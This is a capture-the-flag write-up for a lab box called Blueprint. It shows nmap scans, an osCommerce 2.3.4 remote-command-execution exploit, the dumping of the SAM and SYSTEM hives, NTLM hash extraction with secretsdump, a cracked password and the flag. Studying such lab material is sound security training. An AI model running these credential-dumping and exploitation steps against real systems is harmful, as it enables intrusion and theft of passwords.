# CTF Writeup: Blueprint

---

## Reconaissance

Mapped 10.10.227.185 in /etc/hosts to blueprint.thm domain

```
sudo echo "10.10.227.185  blueprint.thm" | sudo tee -a /etc/hosts
```
Executed nmap scan to enumerate running services and there versions.

```
nmap -n -Pn -sS --top-ports 10000 10.10.227.185
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 07:27 CDT
Nmap scan report for 10.10.227.185
Host is up (0.17s latency).
Not shown: 8364 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 257.95 seconds
```

```
nmap -n -Pn -sCV -p 80,135,139,443,445,3306,8080,49152,49153,49154,49158,49160 blueprint.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 07:33 CDT
Nmap scan report for blueprint.thm (10.10.227.185)
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2h PHP/5.6.28)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_ssl-date: TLS randomness does not represent time
|_http-title: Index of /
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-05T12:34:36
|_  start_date: 2025-09-05T11:45:38
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:4f:6e:6d:61:c5 (unknown)
|_clock-skew: mean: -20m12s, deviation: 34m38s, median: -13s
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-05T13:34:36+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.03 seconds

```
## Initial Access 

Since there is multiple websites running, I decided to analyze them first.

The Website running under port 8080, is interesting. It prompts us to an file path in which there is an folder called "oscommerce-2.3.4" googled it and immediatly found an exploit + more information about it.

```
https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
```

osCommerce 2.3.4 is an web application system, with a critical vulnerability. Allowing us remote command execution.

Downloaded exploit locally and executed the command utilizing following command:

```
python3 osCommerce2_3_4RCE.py http://blueprint.thm:8080/oscommerce-2.3.4/catalog
```

We gained NT AUTHORITY\SYSTEM Privileges.

Since the shell we have has very limited abilities, we will have to execute a special command, which takes the SYSTEM & SAM File/Key from the HKEY_LOCAL_MACHINE Registry Hive and saves it into a file on the web-root on http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/includes/

```
reg.exe save hklm\system SYSTEM
```

```
reg.exe save hklm\sam SAM
```
Downloaded SAM & SYSTEM File.

```
wget http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/includes/SAM        
--2025-09-05 08:22:28--  http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/includes/SAM
Resolving blueprint.thm (blueprint.thm)... 10.10.227.185
Connecting to blueprint.thm (blueprint.thm)|10.10.227.185|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24576 (24K)
Saving to: ‘SAM’

SAM                     100%[==============================>]  24.00K  37.0KB/s    in 0.6s    

2025-09-05 08:22:30 (37.0 KB/s) - ‘SAM’ saved [24576/24576]
```
```
wget http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/includes/SYSTEM
--2025-09-05 08:22:36--  http://blueprint.thm:8080/oscommerce-2.3.4/catalog/install/includes/SYSTEM
Resolving blueprint.thm (blueprint.thm)... 10.10.227.185
Connecting to blueprint.thm (blueprint.thm)|10.10.227.185|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12795904 (12M)
Saving to: ‘SYSTEM’

SYSTEM                  100%[==============================>]  12.20M   254KB/s    in 38s     

2025-09-05 08:23:15 (330 KB/s) - ‘SYSTEM’ saved [12795904/12795904]
```

Since we got the SYSTEM Key to decrypt the SAM database, the next objective will be to get the NTLM Hashes of all the users of the target machine.

Utilized impacket-secretdump for it.

```
impacket-secretsdump -sam SAM -system SYSTEM local        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
[*] Cleaning up...
```
Next objective is to decrypt the NTLM Hash of user "Lab". Utilized the following webpage for it:

```
https://crackstation.net/
```
Password from Lab:googleplus

Gained root.txt in C:\Users\Administrator\Desktop

```
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```
